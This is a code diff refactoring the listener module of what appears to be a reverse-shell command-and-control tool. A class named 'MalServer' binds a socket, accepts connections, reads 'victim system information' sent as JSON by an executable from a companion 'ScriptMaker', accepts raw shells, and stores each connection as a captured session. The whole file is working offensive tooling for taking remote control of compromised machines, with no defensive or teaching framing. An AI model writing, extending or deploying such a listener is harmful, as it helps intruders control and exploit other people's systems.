@@ -1,8 +1,5 @@
-import threading
-import requests
-import socket
-import random
-import Sessions
+import threading, requests, socket, random, json
+import Sessions, Prompt
 
 def GetNetworkIP():
     try:
@@ -29,7 +26,7 @@ def GetPublicIP():
     else:
         return None
     
-def GetIP(ipType:str):
+def GetIP(ipType: str):
     if ipType == "local":
         print("Getting LAN IP. . .")
         return GetNetworkIP()
@@ -41,12 +38,13 @@ def GetIP(ipType:str):
         return ipType
 
 class ServerConfig:
-    def __init__(self, lhost:str, lport:int):
+    def __init__(self, lhost: str, lport: int):
         self.lhost = lhost
         self.lport = lport
         self.capturedSessions = []
         self.sessionThreads = []
-        self.isActive = True
+        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.isActive = False
 
     def GetLhost(self):
         return self.lhost
@@ -66,13 +64,22 @@ class ServerConfig:
     
     def GetSessions(self):
         return self.capturedSessions
-    def AddSession(self, session):
+    def AddSession(self, session:Sessions.Session):
         self.capturedSessions.append(session)
-    def RemoveSession(self, session):
+    def RemoveSession(self, session:Sessions.Session):
         self.capturedSessions.remove(session)
 
     def AddSessionThread(self, t):
         self.sessionThreads.append(t)
+
+    def CreateServer(self):
+        if not self.isActive:
+            self.isActive = True
+            self.serversocket.bind((self.GetLhost(), self.GetLport()))
+            self.serversocket.listen()
+
+    def GetServer(self):
+        return self.serversocket
 
     def KillSessions(self):
         print("[*] Closing Active Sessions. . .")
@@ -83,35 +90,42 @@ class ServerConfig:
             t.join()
         print("[+] Sessions Closed Successfully!")
     
-def RunServer(MalServer):
+def RunServer(MalServer: ServerConfig, handle: Prompt.HandlerPrompt):
     try:
-        id = 0
+        handle.WriteToTerminal(f"[*] Attempting to Bind to >> {MalServer.GetLhost()}:{MalServer.GetLport()}")
 
-        print(f"[*] Attempting to Bind to >> {MalServer.GetLhost()}:{MalServer.GetLport()}")
+        MalServer.CreateServer()
 
-        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        serversocket.bind((MalServer.GetLhost(), MalServer.GetLport()))
-        serversocket.listen()
-
-        print(f"[+] Server Active | {MalServer.GetLhost()}:{MalServer.GetLport()}")
+        handle.WriteToTerminal(f"[+] Server Active | {MalServer.GetLhost()}:{MalServer.GetLport()}")
 
         while MalServer.Active():
-            connection, address = serversocket.accept()
+            connection, address = MalServer.GetServer().accept()
+
             # Upon connection if the server has been shutdown we skip all connection logic
             # concerning Clients
             if MalServer.Active() == False:
                 break
 
-            # Server recieves victim system information
-            sessionData = serversocket.recv(1024).decode()
+            handle.WriteToTerminal(f"[*] Incoming connection | {address}")
+            connection.settimeout(5)
+
+            sessionData = ""
+            try:
+                # Server recieves victim system information
+                # coming from executable from ScriptMaker
+                sessionData = json.loads(connection.recv(4096).decode())
+            except:
+                # captured raw shell (not from executable)
+                sessionData = ""
 
             # Store new Session Connection
+            connection.settimeout(None)
             clientSession = Sessions.Session(connection,address,sessionData)
             MalServer.AddSession(clientSession)
 
         # Shutdown the Socket Server
         MalServer.KillSessions()
-        serversocket.close()
+        MalServer.GetServer().close()
 
         print("[*] Server Session Ended!")
     except Exception as e:
